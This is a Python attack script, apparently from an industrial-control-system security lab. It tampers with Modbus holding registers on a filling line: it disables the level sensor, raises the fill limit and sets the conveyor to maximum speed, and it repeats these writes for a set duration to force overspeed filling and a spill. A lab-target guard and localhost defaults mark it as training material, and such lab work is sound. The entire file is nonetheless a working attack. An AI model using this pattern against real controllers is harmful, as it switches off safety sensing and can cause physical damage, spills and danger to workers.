#!/usr/bin/env python3
"""Attack: force overspeed filling and spill by HR tampering.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 1.0.0
"""

from __future__ import annotations

import argparse
import logging
import time
from typing import Final

from pymodbus.client import ModbusTcpClient

from lab_guard import LabTargetError, assert_lab_target


LOGGER: Final[logging.Logger] = logging.getLogger("attacks.attack_move_fill")


def parse_args() -> argparse.Namespace:
    """Parse CLI arguments."""
    parser = argparse.ArgumentParser(description="Overspeed + overflow attack")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=15020)
    parser.add_argument("--duration", type=float, default=20.0, help="Attack duration in seconds")
    return parser.parse_args()


def main() -> int:
    """Entrypoint."""
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")
    args = parse_args()
    try:
        assert_lab_target(args.host)
    except LabTargetError as exc:
        LOGGER.error("%s", exc)
        return 2
    client = ModbusTcpClient(host=args.host, port=args.port)
    if not client.connect():
        LOGGER.error("Unable to connect to %s:%s", args.host, args.port)
        return 1

    # HR map (1-based):
    # 1 run, 4 level_sensor_enable, 7 fill_limit, 8 speed, 10 sensor_window
    payload = {
        1: 1,      # run
        4: 0,      # disable level sensor
        7: 1000,   # high fill limit
        8: 1000,   # max conveyor speed
        10: 1000,  # wide sensor window
    }
    started_at = time.time()
    try:
        while time.time() - started_at < max(1.0, float(args.duration)):
            for hr, value in payload.items():
                response = client.write_register(address=hr - 1, value=value, device_id=1)
                if response.isError():
                    LOGGER.error("Write failed HR[%04d]", hr)
            time.sleep(0.25)
        LOGGER.info("Attack finished")
    finally:
        client.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
